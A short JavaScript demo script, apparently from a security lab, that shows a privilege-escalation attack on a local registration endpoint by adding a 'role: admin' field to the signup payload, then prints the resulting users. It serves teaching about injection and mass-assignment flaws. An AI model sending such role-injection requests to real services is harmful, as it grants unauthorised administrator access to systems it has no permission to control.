/**
 * attack.js - NoSQL Injection: Privilege Escalation Attack
 * Demonstrates injecting admin role during registration
 */

const SERVER_URL = 'http://localhost:3001';

async function makeRequest(endpoint, payload) {
  const response = await fetch(`${SERVER_URL}${endpoint}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  return { status: response.status, data: await response.json() };
}

async function viewUsers() {
  const response = await fetch(`${SERVER_URL}/users`);
  return await response.json();
}

async function runAttack() {
  console.log('\n=== NoSQL Injection: Privilege Escalation ===\n');
  
  // Normal registration
  console.log('1. Normal Registration:');
  const normal = {
    username: 'normaluser',
    password: 'password123'
  };
  console.log('Payload:', JSON.stringify(normal));
  
  let result = await makeRequest('/register', normal);
  console.log('Result:', result.data);
  console.log('Role assigned:', result.data.role, '\n');
  
  // Attack: inject admin role
  console.log('2. Attack - Injecting admin role:');
  const attack = {
    username: 'attacker',
    password: 'hacked123',
    role: 'admin'  // Injecting admin role
  };
  console.log('Payload:', JSON.stringify(attack));
  
  result = await makeRequest('/register', attack);
  console.log('Result:', result.data);
  console.log('Role assigned:', result.data.role);
  
  if (result.data.role === 'admin') {
    console.log('✓ Attack successful - registered as admin!\n');
  }
  
  // Verify
  console.log('3. Users in database:');
  const users = await viewUsers();
  console.table(users);
}

runAttack().catch(console.error);